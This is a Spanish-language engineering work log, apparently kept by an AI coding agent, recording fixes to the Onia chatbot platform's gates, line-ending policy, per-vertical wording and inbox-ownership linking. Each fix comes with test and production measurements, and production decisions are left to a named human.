      **La respuesta a la pregunta que el ítem hacía: es el precio de Chatwoot, y se paga una
      sola vez.** El **92 %** del peso comprimido es UN chunk, `vite/assets/DashboardIcon-*.js`
      (11,25 MB crudo / 3,14 MB gzip), que se construye dentro del contenedor de Chatwoot —
      partirlo es modificar el motor. Pero se sirve con `max-age=31556952` y nombre hasheado:
      medida la segunda visita del mismo navegador, baja **10 KB en 237 ms — el 0,2 % de la
      primera**. Y no la ve ningún cliente: `grep` de `chat.onia.com.bo` en todo `web-factory/`
      no devuelve **nada**, es el login del MOTOR, que por regla dura "está hecho para no verse".
      No hay nada que arreglar en la pantalla, y se MIRÓ renderizada para decirlo: logo Onia,
      los dos campos y el botón, sin nombres de iconos crudos.
      🔴 **Lo que SÍ estaba roto era el gate, y es el hallazgo que sobrevive al ítem.** La
      baseline se había guardado con los 12.953.799 bytes de aquella lectura. Con
      `derivaPeso: 1.4`, la alarma de peso de esta pantalla sólo saltaba **arriba de 18,1 MB**:
      un gate que no podía dispararse nunca, anclado 3,6× por encima de la realidad — "verde con
      cara de éxito", exactamente lo que este carril existe para cazar, esta vez en el vigilante
      mismo. Reemplazada por la medición real, así el techo absoluto de 4 MB vuelve a ser el que
      manda. La baseline lleva escrito que si una vuelta futura vuelve a leer ~12,9 MB **no es la
      pantalla engordando: es que los assets llegaron sin comprimir**, y eso sí es un ítem.
      **Evidencia:** `hermes-content/docs/historial/canario-visual/2026-09-01-login-chat.png`
      y el script que la saca, `scripts/canario_visual.mjs`.

- [x] **"La cita" ya no le habla de consultorio a una ferretería: cada rubro lee su propia
      palabra.** Cerrado el 2026-09-02 (commit `675541b` de `onia-platform`, rama
      `claude/chatbots-platform-review-0d1d09`). **Commiteado, NO desplegado — y medido el mismo
      día: tampoco llega a `origin/master`, que es de donde se buildea. Ver S16.**
      **Gate 1 primero, en vivo:** el ítem era REAL —`ChatbotClient.tsx` líneas 90, 505, 510 y
      520 seguían con los literales— y no estaba cerrado más abajo.
      🔴 **Pero su diagnóstico estaba incompleto, y el dato que faltaba lo hacía más barato, no
      más caro.** El ítem decía *"lo decide el carril de plataforma"* porque agregar un campo a
      `lib/onboarding/vocabulario.ts` sonaba a tocar un módulo que consumen muchas pantallas.
      Medido: `VOCABULARIOS` es un `Record<VerticalTrackId, …>` con los 7 rubros explícitos, así
      que un campo nuevo es **aditivo** — TypeScript obliga a llenar los 7 y ningún consumidor
      actual se entera (Sidebar y Header leen `busqueda`, el alta lee `ejemploNombre`). Y la
      pantalla rota es `/settings/chatbot`, que es de ESTE carril.
      **Lo que el ítem no vio, y es el corazón del arreglo:** el modelo de dominio ya sabía la
      verdad y la pantalla no la leía. `lib/chatbot/plantillas.ts:53-55` no le da `demo` ni a
      comercio ni a importadora, con su motivo escrito —*"sin cita definida el bot deriva en vez
      de agendar"*—, mientras el editor les pedía igual configurar una cita, en dental.
      **Lo que se hizo:** `cita` y `citaModalidad` en `VocabularioAlta`, los 7 rubros, coherentes
      con la `demo.modalidad` de `plantillas.ts` (clínica/estética/veterinaria "la cita"; estudio
      "la reunión"; comercio, importadora y estancia "la visita"). `ChatbotClient` los recibe por
      prop, y `etiquetaDeCampo` los usa **también en los mensajes de error**, que decían
      "Duración de la cita" para todos. El bloque ahora avisa que dejarlo vacío hace derivar en
      vez de agendar — la regla dura del motor, que ningún rubro leía en pantalla.
      **Por qué el trinquete no lo había atajado, que es el hallazgo que sobrevive al ítem:**
      `__tests__/lib/vocabulario-por-rubro.test.ts` buscaba `paciente|clínica` y **no
      `consultorio`** — igual de dental, sólo que nombra el LUGAR en vez de la persona. Por eso
      esta pantalla pasó por debajo. Agregada la palabra al regex; radio medido ANTES de
      ampliarlo: **un solo archivo** (el otro hit era un comentario, y `textoVisible` los
      strippea), o sea que el trinquete no arrastró deuda ajena.
      **Probado que los tests MUERDEN, no sólo que pasan:** revertidos a mano los dos literales,
      **5 tests se ponen rojos** (los 3 de rubro no-clínico + los 2 del trinquete) y vuelven a
      verde al restaurarlos. El nuevo `app/(dashboard)/settings/chatbot/bloque-cita.test.ts`
      **RENDERIZA el componente real** con `renderToStaticMarkup` y lee el HTML: un grep no
      distingue el literal viejo de una prop bien cableada. Va en `.ts` con `createElement` a
      propósito, para no tocar el `include` de `vitest.config.ts`, que comparten todos los
      carriles.
      **MIRADO renderizado en Chromium** (los tres rubros lado a lado): la ferretería lee
      **"La visita" / "en el local"**, la clínica conserva **"La cita" / "en el consultorio, o
      por videollamada"** —el arreglo no le quitó su palabra— y el estudio contable lee
      **"La reunión"**. ⚠️ **Con hoja de estilos sustituta, no la de producción:** este disco no
      tiene `.env` ni base sembrada, así que `/dev/demo` no levanta, y Tailwind v4 va por postcss
      (no hay binario para compilar los tokens sueltos). Lo verificado es el **texto y la
      estructura** del componente real; la piel de producción no se miró.
      **Gates:** `tsc --noEmit` limpio · **2441 tests** verdes (197 archivos) · `eslint` 0
      errores, y 0 warnings en los 5 archivos tocados.

- [x] **`espejo-check.mjs` quedó ciego el mismo día que el loop se mudó al VPS: intentaba
      SSH a sí mismo con una clave que no existe en el host.** Encontrado midiendo el ítem de
      "Ahora" (`npm run marca:chatwoot`, que SÍ funciona porque es un GET puro) y corriendo
      después el otro gate del carril por costumbre: `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs`
      tiraba `Permission denied (publickey)` contra `root@187.77.16.63` con la clave
      `~/.ssh/onia_hermes_vps_ed25519`, que no está en este disco — porque este disco YA es
      `187.77.16.63`, desde que `hermes-content/docs/cola/loops.md` movió el loop acá el
      2026-09-01. El gate no medía drift: **no corría nada**, y un gate que siempre truena se
      apaga o se ignora, que es el mismo fantasma que este script existe para matar.
      **Lo que se hizo:** `ladoVps({host, key, dir})` — si `dir` (`/opt/onia/bot`) existe en
      este mismo disco, lo lee directo con `md5Local`, sin SSH ni clave; si no, cae al SSH de
      siempre (loop corriendo fuera del VPS). `main()` usa `ladoVps` en vez de `md5Vps` a
      secas.
      **Probado que compara de verdad, no sólo que no truena:** corrido después del arreglo
      contra el `/opt/onia/bot` real del VPS, sale **`ESPEJO DESINCRONIZADO`** y nombra
      `knowledge.mjs` y `recepcionista.mjs` — exactamente los dos archivos que **S9** dice que
      faltan viajar — más el drift honesto de herramienta (`espejo-check.mjs` y su propio
      test, recién tocados) y `evals-contrato.test.mjs` (ya sabido, va en el `scp` de S9). El
      gate vuelve a decir la verdad sin tocar el VPS.
      **1 test nuevo** (`ladoVps` con un directorio temporal y un host/clave rotos a
      propósito: si intentara SSH, tiraría). Suite del bot **684/684** verde (683 antes).
      ⚠️ **No repara nada del VPS**, sólo el gate que lo mide. `chatwoot-marca-publica.mjs` y
      `campanas-vivas.mjs` no tenían este problema: son GET puro, sin SSH.

- [x] **El espejo del bot ya tiene política de fin de línea: un `git checkout` no vuelve a
      fabricar un deploy pendiente.** Cerrado el 2026-09-01 con las tres partes del "Hecho =".
      **1 · La política existe y es del alcance exacto:** `hermes-content/deploy/vps-ops/.gitattributes`
      suma `bot/*.mjs text eol=lf` al `*.sh text eol=lf` que ya tenía. El patrón lleva `bot/`
      a propósito — hay 40+ `.mjs` sueltos en `vps-ops/` que NO son el espejo, y `evals/` queda
      afuera igual que en el gate (`md5Local` no baja de `maxdepth 1`). Los `.sh` siguen forzados
      a LF por el motivo de siempre: ahí el `\r` no es cosmético, `#!/bin/bash` con CR no arranca.
      (Detalle encontrado de paso: ese `.gitattributes` estaba él mismo en CRLF.)
      **2 · Medido con un checkout real, no deducido:** `guardrails.mjs` borrado y restaurado con
      `git checkout --` sale ahora en **5506 bytes con 0 `\r`**; antes de la política el mismo
      checkout lo dejaba en **5636** (+130, una por línea), y ése era el rojo falso. Renormalizados
      además los **21 `.mjs` que estaban en CRLF en disco** con el blob en LF — o sea que
      coincidían con el VPS por casualidad. `git status` del espejo: limpio.
      **3 · El test que lo cuida:** `espejo-check.test.mjs` corre `git check-attr eol` sobre los
      `.mjs` sueltos del espejo y exige `lf` en todos. Lee la política **efectiva**, no el texto del
      archivo: es lo que git va a aplicar en el próximo checkout, que es justo lo que se cuida. Rojo
      por el motivo correcto antes del arreglo (los 60+ archivos listados uno por uno), verde después.
      Suite del bot **683/683** (los 671 de siempre + 12 evals, con éste adentro).
      ✅ **Y no agregó un solo rojo al gate**, que es lo único que probaba que el arreglo no
      desincronizaba nada: `espejo-check.mjs` sigue nombrando drift **honesto**, verificado abriendo
      los archivos contra el VPS en vez de creerle al hash — `recepcionista.mjs` (20 líneas) y
      `knowledge.mjs` (3) difieren por el opt-in `prefijo` del commit `ba970f4a`: contenido, no fin
      de línea. Por construcción no podía agregarlos, porque el gate hashea los `.mjs` sin `\r` de
      los dos lados desde la vuelta anterior. Los 8 rojos de hoy —`bot-engine.test.mjs`,
      `campanas-web.test.mjs`, `espejo-check.mjs`, `espejo-check.test.mjs`, `knowledge.mjs`,
      `recepcionista.mjs`, `recepcionista.test.mjs` y `evals-contrato.test.mjs` (falta en el VPS)—
      son el `scp` de **S9**, que escribe en el VPS y por eso es de Sergio.
      **Lo que la opción 1 traía y NO hizo falta:** el redeploy del directorio entero. La
      normalización quedó del lado del repo, y como el gate ya comparaba normalizado, el espejo pasa
      a ser un espejo de verdad **sin tocar producción**. Radar §12 cerrado.

      <details><summary>La historia de las nueve vueltas que costó (por qué la regla existe)</summary>

      **`git checkout` en este repo DESINCRONIZA el espejo del bot sin mostrar un solo cambio
            — y pone rojo el gate que existe para detectar drift real.** Encontrado por las malas al
            cerrar el ítem de `hermes-content/deploy/vps-ops/bot/recepcionista.test.mjs`: después de mutar y restaurar
            `hermes-content/deploy/vps-ops/bot/recepcionista.mjs` con `git checkout --`, `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` lo reportó **DISTINTOS**
            contra el VPS, mientras `git status --porcelain` daba **vacío**.
            **La causa, medida:** `core.autocrlf=true` y **no hay `.gitattributes`** en `onia-hermes`.
            Git guarda el blob en LF y lo materializa en CRLF al hacer checkout; el archivo pasó de
            **14110 bytes (LF, lo que corre el VPS) a 14375 (CRLF)** — exactamente +265, una por línea.
            Contenido idéntico: `diff` normalizando `\r` sale **vacío** contra
            `/opt/onia/bot/recepcionista.mjs`.
            **Por qué importa acá y no en otro carril:** `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` compara **md5 de bytes**, y
            tiene que hacerlo — en un .sh un CRLF no es cosmético, el shebang con CR al final no arranca. O sea
            que el gate no puede perdonarlo, y entonces cualquiera que haga `git checkout` sobre el
            espejo fabrica un "deploy pendiente" que nadie pidió. Es el molde exacto del fantasma que
            este carril mide: **un rojo que no corresponde a ningún cambio se apaga o se "arregla"
            con un deploy inútil.**
            **El espejo hoy es una MEZCLA**, no todo LF: `hermes-content/deploy/vps-ops/bot/knowledge.mjs` está en LF en disco y en git
            (diff 0), mientras `hermes-content/deploy/vps-ops/bot/guardrails.mjs` (+130) e `hermes-content/deploy/vps-ops/bot/intents.mjs` (+754) están en CRLF en los dos
            lados. Por eso **no se arregló en esta vuelta**: un `.gitattributes` con `text eol=lf`
            renormalizaría ~60 archivos y desincronizaría contra el VPS todos los que hoy son CRJF de
            ambos lados — se arregla con un redeploy completo del directorio, y eso es de Sergio.
            **El parche de esta vuelta fue puntual:** `perl -pi -e 's/\r\n/\n/g'` sobre el archivo
            tocado, verificado con `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` (vuelve a 14110 y sale del listado).
            **Lo mínimo que lo cierra:** decidir la política de line endings del espejo
            (`.gitattributes` con `eol=lf` + un redeploy del directorio entero, que alinea los dos
            lados de una vez) — o dejarlo escrito acá para siempre. Lo primero es un deploy: **de
            Sergio**. Tres opciones cotizadas en
            `hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md` §12 (recomendación: opción 1, y
            sola en su commit; la 3 —normalizar `\r` sólo en .mjs dentro de `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`— es
            el paliativo si no hay ventana de deploy).

            ✅ **Vuelta del 2026-08-31 — la opción 3 (el paliativo) ESTÁ HECHA: el gate ya no
            fabrica rojos falsos.** Gate 1 primero, corriendo el gate contra producción: salía
            **rojo por `hermes-content/deploy/vps-ops/bot/recepcionista.test.mjs`**, y ese resultó ser drift REAL y no el fantasma del
            fin de línea — el archivo tiene **9783 bytes en el espejo y 0 en el VPS** (`d41d8cd9…`,
            el md5 del archivo vacío). O sea que el rojo de hoy no era el que este ítem describe; el
            defecto igual estaba vivo y sin arreglar.
            **La trampa medida hoy, que cambió desde que se escribió el ítem:** el espejo ya no es la
            mezcla pareja que dice arriba — **69 archivos de código están en CRLF en disco**
            (incluidos `hermes-content/deploy/vps-ops/bot/bot-engine.mjs`, `hermes-content/deploy/vps-ops/bot/knowledge.mjs`, `hermes-content/deploy/vps-ops/bot/run-turn.mjs` y el propio
            `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`), mientras el blob de git es LF por `core.autocrlf=true`. El VPS
            también los tiene en CRLF, así que hoy coinciden **por casualidad**: alcanza un
            `git checkout` — o correr el gate desde Linux — para volver rojos ~60 archivos que nadie
            tocó.
            **Lo que se hizo:** `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` exporta `md5Archivo(nombre, contenido)` y hashea el
            .mjs **sin el `\r`, de los dos lados** — local con `Buffer.filter`, y el comando remoto
            con `tr -d` en vez de `md5sum` a secas. Es `tr` y no `sed` a propósito: sed agrega un
            salto final si el archivo no lo tenía, y sin esa simetría exacta los dos hashes no
            comparan nunca. El .sh sigue byte-exacto — ahí el shebang con CR al final no arranca, y esa
            asimetría es la razón de que el gate no pueda perdonar el byte en general.
            **Probado contra producción y no con un fixture**, que es lo único que prueba que el lado
            remoto también normaliza: se pasó `hermes-content/deploy/vps-ops/bot/guardrails.mjs` a LF — **5636 → 5506 bytes, md5 crudo
            distinto**, con el VPS en CRLF — y el gate **no lo nombró**; antes de este cambio ése era
            exactamente el rojo falso. Restaurado byte a byte después (`441cdd70…`, 5636). Los tres
            rojos que quedan son honestos: `hermes-content/deploy/vps-ops/bot/recepcionista.test.mjs` (drift real, va en S9) y los dos
            archivos de este mismo cambio.
            **4 tests nuevos**, incluido el guardia que impide que el arreglo se vuelva una tapadera
            (*normalizar NO tapa el drift real*, con el caso de 0 bytes medido hoy) y el que fija la
            asimetría del .sh. Suite del bot **658/658** verde (654 antes).
            ⚠️ **Lo que NO cierra, y por eso el ítem queda abierto:** la opción 1 —`.gitattributes`
            con `eol=lf` + redeploy del directorio— sigue siendo de Sergio, y es la única que hace
            que el espejo sea un espejo. La 3 baja el ruido pero **deja los dos lados distintos de
            verdad**: el día que haga falta un `scp` selectivo por md5, el md5 crudo sigue sin
            coincidir. Radar §12 actualizado: de las tres opciones ya sólo queda viva la 1.
            📎 **Efecto secundario que hay que saber antes de mirar el gate:** `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` y
            `hermes-content/deploy/vps-ops/bot/espejo-check.test.mjs` ahora salen DISTINTOS contra el VPS, porque son los archivos que
            acaban de cambiar. Es drift honesto y no urgente — son herramienta de desarrollo, no el
            motor: no cambian una línea de lo que corre. Se suman al `scp` de S9 cuando haya ventana.

            ✅ **Promovido a "Ahora" el 2026-08-31, y NO por turno: hoy tiene trabajo que ayer no
            tenía.** El ítem quedaba en Después porque su única salida viva —la opción 1,
            `.gitattributes` con `eol=lf`— arrastraba un redeploy del directorio entero, y eso es de
            Sergio. **Eso cambió con el paliativo de la séptima vuelta, y se midió antes de
            promoverlo, leyendo el gate y no el ítem:** `hermes-content/deploy/vps-ops/bot/espejo-check.mjs:37`
            hashea los .mjs **sin el `\r` de los dos lados** (`md5Archivo` local, `tr -d` remoto).
            O sea que forzar LF en los .mjs del espejo **ya no desincroniza nada contra el VPS**:
            el gate los compara normalizados. Confirmado además que el hueco sigue abierto:
            `git config core.autocrlf` → `true` y `.gitattributes` **no existe** en `onia-hermes`.
            ⚠️ **El .sh queda AFUERA del arreglo, a propósito** — ahí el byte sí cuenta
            (#!/bin/bash\r no arranca), el gate lo compara byte a byte, y tocarlo sí necesitaría
            el redeploy de Sergio. **Hecho =** `.gitattributes` que fuerza LF sólo en los .mjs del
            espejo, `hermes-content/deploy/vps-ops/bot/espejo-check.mjs` sigue en 0 contra producción después del checkout, y un test
            que se ponga rojo si alguien vuelve a dejar el directorio sin política.

      </details>

- [x] **El guardia de las frases de campaña medía el REPO, no la web que sirve producción — y
      la primera medición que lo destapó estaba ella misma rota.** Encontrado auditando los `[x]`
      recientes contra el código de hoy, que es lo que manda el loop cuando "Ahora" queda
      bloqueado (el único ítem de Ahora cuelga de S9, que es de Sergio).
      **Lo que se auditó primero, y salió cierto** — se escribe porque una auditoría que sólo
      reporta lo que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy |
      |---|---|
      | suite del bot **682/682** | `npm run test:bot` → **682 pass, 0 fail**: reproduce |
      | `espejo-check.mjs` sale 1 y nombra los archivos de S9 | exit **1**. DISTINTOS de motor = `knowledge.mjs` y `recepcionista.mjs`, **exactamente los dos** que S9 manda viajar; `bot-engine.mjs` ya está en sync |
      | objetivo CUMPLIDO: `Onia (interna)` → inbox 5 | base de producción: `c956c02fccd8573cd6fcc5b35` → **5**. El vínculo sigue vivo; las otras tres orgs siguen en NULL salvo la de QA (7) |
      | "este repo no tiene TS, eslint ni vitest" | `node_modules/.bin/` no tiene ninguno de los tres: el gate que aplica es la suite |
      📎 **Trampa de medición que se llevó una consulta y queda escrita:** `node gate.mjs | tail`
      reporta el `$?` de **`tail`**, no el del gate — salió `EXIT=0` sobre un gate que estaba
      diciendo `ESPEJO DESINCRONIZADO`. Un exit code se mide **sin pipe**.
      **El hueco, que no estaba escrito en ninguna parte.**
      `hermes-content/deploy/vps-ops/bot/campanas-web.test.mjs` extrae las frases en vez de
      hardcodearlas — bien — pero las extrae de `web-factory/apps/onia-platform/src/`, o sea del
      **repo**. Producción se sirve de un build, y la web es de **otro carril**: el día que
      web-factory despliegue un cambio que este árbol no tiene (o al revés), el test queda
      **verde** mientras el desconocido recibe el saludo genérico. Es el molde del carril entero:
      un guardia que mide el lado equivocado.
      **Medido contra producción y no leído:** las **5** frases que onia.com.bo manda hoy están
      las cinco cubiertas por el documento (4 exactas + el prefijo de `/v1/empezar`). Hoy
      coinciden; que coincidan era **suerte, no una medición**.
      **Lo que se hizo:** `hermes-content/deploy/vps-ops/campanas-vivas.mjs` — mira las frases
      **desde la calle**, igual que `chatwoot-marca-publica.mjs`: un GET a las 11 páginas, sin
      VPS, sin docker, sin token, desde cualquier máquina (`npm run campanas:vivas`). El match
      **no se reimplementa**: importa `campanaExacta` del motor, así que la regla del prefijo y la
      normalización son las de producción y no una copia que se despega. Corrido contra
      producción: `5 frases vivas, 5 con campaña (documento 2026-08-31.2)`, exit **0**.
      📎 **Un tropiezo que queda escrito porque casi cierra la vuelta al revés:** la primera
      medición usó una clase negativa con un backslash de menos, y en regex eso excluye la
      **letra `s`**. Cortaba "…Quiero " justo antes de "saber" y reportaba las cinco frases vivas
      como **SIN CAMPAÑA** — un rojo inventado sobre un dato de entrada truncado, y a un gate así
      lo apaga alguien. Por eso el extractor usa una clase **positiva** (lo que produce
      `encodeURIComponent`), que además corta sola donde tiene que cortar: en la comilla del href
      suelto y en la barra invertida del payload RSC de Next.
      **11 tests** (`npm run test:campanas-vivas`), **probado que pueden fallar**: reinyectada la
      clase negativa con el backslash de menos, **3 se ponen rojos** y uno nombra el corte en la
      `s`. Restaurado byte a byte después.
      ⚠️ **Lo que este gate NO hace, dicho para que nadie lo cuente de más:** mide que el
      **documento** cubra lo que la web manda. **No** mide que el VPS tenga el documento — eso
      sigue siendo **S9**, y se verifica con el `grep -c campanas` dentro del contenedor. Uno se
      corre **antes** de publicar, el otro **después**.
      📎 Va en `vps-ops/` y no en `bot/` por la misma razón que `chatwoot-marca-publica.mjs`:
      un `.mjs` nuevo en `bot/` deja `espejo-check.mjs` rojo hasta el próximo `scp`. Verificado
      después de crearlo — el espejo nombra los mismos archivos de siempre.
      **Gates:** suite del bot **682/682** (no se tocó el motor) + los **11** nuevos. Este repo no
      tiene tsc/eslint/vitest: la suite es el gate que aplica.

- [x] **1 · Una org sólo puede tener UN inbox, y nadie puede cambiarlo — así ningún WhatsApp
      llega nunca a la bandeja.** Éste es el hueco que hace inalcanzable el objetivo, y no
      estaba escrito en ninguna parte. Verificado hoy, en cuatro archivos:
      - Al crear la org se le crea un inbox **web** y ése se guarda:
        `app/api/admin/clinics/route.ts:97` (`createInbox` + `update chatwootInboxId`).
      - Una vez puesto, **nunca se pisa**: `lib/chatbot/canal-web.ts:27` devuelve
        `created:false` y se va; `app/api/admin/chatbots/route.ts:53` hace lo mismo.
      - La única pantalla que lo muestra es **de sólo lectura**:
        `app/(dashboard)/admin/organizations/[id]/WhatsAppOrgConfig.tsx:215` lo pinta en un
        `<dd>`, sin input ni PATCH.
      - Y no hay nada del otro lado: **cero apariciones** de `embedded` en todo `app/` y
        `lib/` de la plataforma.
      **Medido en la base el 2026-08-31 (ya no es una lectura de código, es el estado real):**
      de las cuatro orgs que existen, **una sola tiene inbox — y es la org QA**
      (`ZZ QA Clinica Chatbot` → inbox 7). Las otras tres (`Onia (interna)`,
      `Bolivian electricidad`, `ZZ QA Ferreteria Tornillo`) tienen `chatwootInboxId` en NULL.
      Los dos inboxes donde escribió gente de verdad — **4 (Onia Web)** y **5 (Onia WhatsApp)** —
      no son de ninguna org. La tenencia la da esa columna y sólo esa
      (`lib/chatbot/bandeja-auth.ts:22`), así que hoy `/inbox` sólo puede mostrar conversaciones
      QA: las nuestras.
      **La consecuencia hoy:** el inbox de WhatsApp del +591 75414930 existe en Chatwoot
      (alta manual, hecha dos veces) pero no es el `chatwootInboxId` de ninguna org, así que
      `lib/chatbot/bandeja.ts` no lo puede mostrar. **Y ya costó:** las cinco conversaciones de
      desconocidos que se contaron hoy están todas en los inboxes 4 y 5 — ninguna se ve. Este
      ítem dejó de ser un riesgo futuro: es la única pieza entre el objetivo y estar cumplido. **La consecuencia mañana:** el día que
      Sergio corra la prueba del popup de Embedded Signup, nace un inbox de WhatsApp que la
      plataforma **va a ignorar** — el cliente conecta su número y su bandeja sigue vacía. La
      pieza que gatea todo el carril entrega un inbox huérfano.
      **Hecho =** un mensaje enviado al +591 75414930 aparece en `/inbox`, MIRADO con captura.
      **Lo mínimo que lo logra** (elegir al construir, no ahora): un PATCH de superadmin que
      apunte una org a un inbox existente. Lo caro sería una tabla de N inboxes por org —
      no hace falta hasta que un cliente tenga web **y** WhatsApp a la vez.

      ⚙️ **El código está construido y con gates verdes (2026-08-31, commit `88c1d56` del repo
      `onia-platform`), pero el ítem NO se cierra: sigue sin haber una conversación de un
      desconocido visible en `/inbox`, que es el objetivo.** Lo que se hizo: se extendió el
      PATCH de superadmin que YA existía (`app/api/admin/organizations/[id]/whatsapp/route.ts`)
      en vez de agregar una ruta nueva — acepta `chatwootInboxId` entero positivo o `null` para
      desvincular, y devuelve **409 si otra org ya usa ese inbox** (sin ese guardia dos orgs
      se ven las conversaciones entre sí: la tenencia la da esa sola columna). La pantalla
      `app/(dashboard)/admin/organizations/[id]/WhatsAppOrgConfig.tsx` dejó de ser un `<dd>`
      de sólo lectura: ahora es input + botón "Vincular". 11 tests nuevos; `tsc --noEmit`,
      `eslint` y los 2342 tests de la suite, verdes.
      ⚠️ **Falta lo que no depende de código, y son las dos cosas que lo cierran:** (1) el
      deploy del producto, que es de Sergio, y (2) decidir qué org se queda con los inboxes 4
      y 5 — anotado como **S8**, y cotizado en
      `hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md`.
      ⚠️ **La pantalla NO se pudo MIRAR, y se dice en vez de simularlo:** es superadmin, así
      que necesita base + sesión. El `DATABASE_URL` de `.env.local` apunta a
      `127.0.0.1:54329`, que está cerrado (de los puertos de Supabase local sólo 54322 acepta
      conexión TCP, y ahí el handshake de Postgres expira). Producción sí responde pero
      todavía sirve la versión vieja. **La captura se toma en el primer deploy** — es lo
      primero que hay que hacer al retomar, antes que cualquier ítem nuevo.

      ✅ **Vuelta del 2026-08-31 (tercera) — la pantalla YA SE MIRÓ, y no hizo falta ningún
      deploy: lo que estaba roto era el entorno local, no la base.** El diagnóstico de arriba
      era correcto en el síntoma y equivocado en la causa, y por eso el ítem quedó tres
      vueltas esperando a Sergio para algo que no dependía de él.
      **La causa real.** El stack de Supabase local **está corriendo hace 31 h**
      (`docker ps` → `supabase_db_fiscal-mock`, healthy). Lo que no existe son los puertos que
      `.env.local` pedía: `supabase/config.toml` del propio repo declara API `55321` y
      Postgres `55322`, mientras el env apuntaba a `54321`/`54329`. Y `54329` no era "un
      puerto cerrado" cualquiera: es el del **pooler, que el config tiene `enabled = false`**,
      con un usuario ("postgres" con sufijo "onia") que ni figura en `pg_user`. Las claves anon y
      service_role tampoco eran las del stack — firmadas con otro secreto, daban 403 contra
      `/auth/v1/admin/*`. Tres datos mal, ninguno de ellos la base.
      **Lo que se hizo:** se corrigió `.env.local` (puertos reales, `postgres:postgres`,
      `?schema=public` como producción, claves firmadas con el `GOTRUE_JWT_SECRET` del
      contenedor), se creó un superadmin local (usuario por `/auth/v1/admin/users` + su fila
      en `profiles` con `role='SUPERADMIN'`), y se levantó el producto con
      `npm run build` + `node .next/standalone/server.js`.
      **Lo verificado MIRANDO, en la pantalla real** (`/admin/organizations/<id>`, sesión de
      superadmin, captura leída):
      1. La tarjeta **ESTADO TÉCNICO** ya no es un `<dd>`: muestra *"Chatwoot Inbox ID · De la
         tenencia de la bandeja. Vaciar para desvincular."* con input numérico (`No vinculado`)
         y botón **Vincular**.
      2. Vincular el inbox 5 a `Ferreteria Circuito Completo` → banner verde
         **"Org vinculada al inbox 5."**, y la fila queda persistida en la base
         (`clinic_settings.chatwootInboxId = 5`, releída por SQL después del click).
      3. **El guardia de tenencia funciona:** el mismo inbox 5 sobre la otra org devuelve el
         409 con su mensaje en pantalla — *"El inbox 5 ya es de «Ferreteria Circuito
         Completo»"* — y la base sigue con una sola org vinculada. Sin ese guardia dos orgs se
         leerían las conversaciones entre sí, así que era la parte frágil y es la que se probó.
      **La receta completa quedó en la skill que corresponde**, no en un doc suelto:
      `.claude/skills/onia-verificacion/SKILL.md` del repo onia-platform, § "Levantar el entorno LOCAL
      para poder MIRAR" — incluye las trampas que costaron esta vuelta (Prisma no lee
      `.env.local`; `?schema=dentalgest` hace fallar una migración que en `public` está bien;
      `onboardingCompletedAt` en NULL redirige todo a `/onboarding`; `next dev` en Windows
      panickea con Turbopack y recarga en loop con `--webpack`).
      🔗 **Hermano del mismo agujero, arreglado hoy por el carril de plataforma** (commit
      `7791ea3`, `onia-platform`): `encenderCanalWeb()` adoptaba un inbox de Chatwoot buscándolo
      **por nombre**, y el inbox se llama igual que la org — con dos "Clínica Dental" la
      segunda se quedaba con la bandeja de la primera. Es la misma llave de tenencia que este
      ítem: el PATCH ya tenía su 409, y ahora el alta automática también filtra los inboxes ya
      tomados. Se anota para que no se lo cuente dos veces: **no destraba nada de S8**.
      ⚠️ **Esto NO cierra el ítem** — el "Hecho =" sigue siendo un mensaje de un desconocido
      visible en `/inbox`, y para eso falta **S8** (deploy + dueño de los inboxes 4 y 5). Lo
      que cierra es la duda sobre el código: la pieza que S8 va a encender está mirada y
      probada, incluido su caso de error.

      ✅ **Gate 1 del 2026-08-31 (cuarta vuelta): EL DEPLOY YA ESTÁ HECHO. S8 se achicó a la
      mitad — queda la decisión y dos clicks, nada más.** Medido en producción, no leído:
      - **El build del producto trae el PATCH.** `onia-platform` buildeó a las 22:59 y el
        contenedor arrancó 23:00 (UTC). En sus chunks del servidor están las dos cadenas
        exactas de `88c1d56`: `` El inbox ${d} ya es de "${e.organization?.name…`` (el 409 de
        tenencia) y `chatwootInboxId debe ser un entero positivo o null` (el 400).
        ⚠️ **Y acá casi escribo el fantasma al revés:** el primer `grep` acotado a
        `.next/server/app/api/admin/organizations/` dio **cero** y parecía probar que el deploy
        no traía nada. Era falso — `route.js` son 648 bytes de loader y el código vive en
        `chunks/[root-of-the-server]__*.js`. Un grep que no encuentra descarta un lugar, no
        el hecho.
      - **La base sigue sin vincular.** Consultada en vivo (`supabase-db`, schema `public`): de
        las cuatro orgs, la única con `chatwootInboxId` es `ZZ QA Clinica Chatbot` → 7.
        `Onia (interna)`, `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL. Los
        inboxes 4 y 5 siguen huérfanos, así que las cinco conversaciones de desconocidos
        siguen invisibles.
      **Lo que queda de S8, entero:** entrar a `/admin/organizations/<id>` de `Onia (interna)`,
      escribir `5` y apretar Vincular. La pantalla ya está desplegada y ya fue mirada.

      ✅ **Gate 1 del 2026-08-31 (quinta vuelta) — sigue igual, y se midió en la base, no se
      leyó.** Consultada en vivo (`supabase-db`, schema `public`), de las cuatro orgs la única
      con `chatwootInboxId` sigue siendo `ZZ QA Clinica Chatbot` → 7; `Onia (interna)`,
      `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL. **Los dos clicks de S8 no
      se dieron todavía**, así que las cinco conversaciones de desconocidos siguen invisibles y
      el ítem sigue siendo el único que separa al carril de su objetivo. No se tocó la base:
      elegir dueño de inbox decide en qué bandeja aterrizan personas reales, y eso es de Sergio.

      ✅ **Gate 1 del 2026-08-31 (octava vuelta) — la base sigue igual, medida en vivo.** `supabase-db`, schema `public`: de las cuatro orgs la única con `chatwootInboxId` sigue siendo `ZZ QA Clinica Chatbot` → 7; `Onia (interna)`, `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL. **Los dos clicks de S8 siguen sin darse**, así que las cinco conversaciones de desconocidos siguen invisibles. No se tocó la base: elegir dueño de inbox decide en qué bandeja aterrizan personas reales, y eso es de Sergio.

